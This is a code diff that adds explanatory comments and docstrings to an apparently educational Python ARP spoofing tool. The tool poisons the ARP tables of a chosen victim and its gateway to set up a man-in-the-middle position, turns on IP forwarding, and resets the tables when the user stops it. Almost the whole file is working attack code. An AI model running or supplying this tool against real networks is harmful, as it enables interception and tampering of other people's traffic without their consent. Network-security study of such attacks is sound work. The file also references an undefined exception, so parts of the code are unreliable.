@@ -4,35 +4,67 @@ import argparse
 import time
 import os
 
+'''
+Error raised if the user doesn't specify a valid target IP address
+'''
 class NoTargetSpecified(Exception):
     pass
 
+
+'''
+Error raised if the user doesn't specify a valid gateway IP address
+'''
 class NoGatewaySpecified(Exception):
     pass
 
-#Evaluate MAC address of a specific IP
+
+'''
+Evaluate MAC address of a specific IP
+'''
 def get_MAC(ip):
-    arp_header = ARP(pdst=ip)
+    #ARP request of resolution of IP address ip
+    arp_header = ARP(pdst=ip) 
+    
+    #ARP request sent in broadcast to all hosts connected in the network
     eth_header = Ether(dst="ff:ff:ff:ff:ff:ff")
+    
+    #Creation of packet by appending ARP packet to Ethernet header
     packet = eth_header/arp_header
-
+    
+    #Send packet of layer 2 to each user in the network
+    #and wait for timeout seconds for the response
+    #response_list = srp()[0]= answers
+    #response_list[1]=unanswered
     response_list = srp(packet, timeout=1, verbose=False)[0]
-
+    
+    #response_list[0] correspond to first response 
+    #(we want to obtain MAC of a specific IP address)
+    #first_element[0] = request done for which I obtain a respons
+    #first_element[1] = response to request
     return response_list[0][1].hwsrc
 
-#Use ARP response to update MAC address of spoof_ip on victim_IP ARP table 
+
+'''
+Send ARP response to update MAC address of spoof_ip on victim_IP ARP table
+'''
 def spoof(victim_IP, victim_MAC, spoof_IP):
+    #Update ARP table of victim sending an ARP packet
     packet = ARP(op=2, pdst=victim_IP, hwdst=victim_MAC, psrc=spoof_IP)
     send(packet, verbose=False)
 
 
-#Evaluate if IP_address is valid
+'''
+Evaluate if IP_address is valid
+'''
 def check_format_IP(IP_address):
+    #Split the IP address in the fields separated by '.'
     IP_numbers = IP_address.split('.')
     
+    #Error in the format if the number of fields is != 4 
     if len(IP_numbers)!=4:
         raise NoNetworkSpecified
     else:
+        #Check if each field has valid value (>=0 and <256)
         for num in IP_numbers:
             if(int(num)>255 or int(num)<0):
                 raise NoNetworkSpecified
@@ -40,13 +72,19 @@ def check_format_IP(IP_address):
     return IP_address
 
 
+'''
+Reset ARP tables of gateway and victim by sending ARP responses
+'''
 def reset_arp_tables(target_IP, target_MAC, gateway_IP, gateway_MAC):
     packet = ARP(op=2, pdst=target_IP, hwdst=target_MAC, psrc=gateway_IP, hwsrc=gateway_MAC)
     send(packet, count=4, verbose=False)
     packet = ARP(op=2, pdst=gateway_IP, hwdst=gateway_MAC, psrc=target_IP, hwsrc=target_MAC)
     send(packet, count=4, verbose=False)
 
-#Parser of command line arguments
+
+'''
+Parser of command line arguments
+'''
 def args_parser():
     #Parser of command line arguments
     parser = argparse.ArgumentParser()
@@ -78,17 +116,21 @@ def args_parser():
     return target_IP, gateway_IP
 
 
-
+'''
+Main function
+'''
 def main():
+    #Needed operation to guarantee that the machine works forwarding machine
     os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')
 
-    #To establish MIDM connection, we need to repeat the update of ARP 
-    #table for victim and gateway otherwise it is automatic reset
+    #Obtain MAC address of specified IP addresses
     target_IP, gateway_IP = args_parser()
     target_MAC = get_MAC(target_IP)
     gateway_MAC = get_MAC(gateway_IP)
     num_pkts = 0
 
+    #To establish MITM connection, we need to repeat the update of ARP 
+    #table for victim and gateway otherwise it is automatically reset
     try:
         while True:
             #Send ARP response to target_IP so my PC pretends to be the gateway
@@ -104,6 +146,7 @@ def main():
     except KeyboardInterrupt:
         print("\n\n[Detected CTRL+C] Closing the program...", end='\n\n')
         reset_arp_tables(target_IP, target_MAC, gateway_IP, gateway_MAC)
+
 
 if __name__=="__main__":
     main()
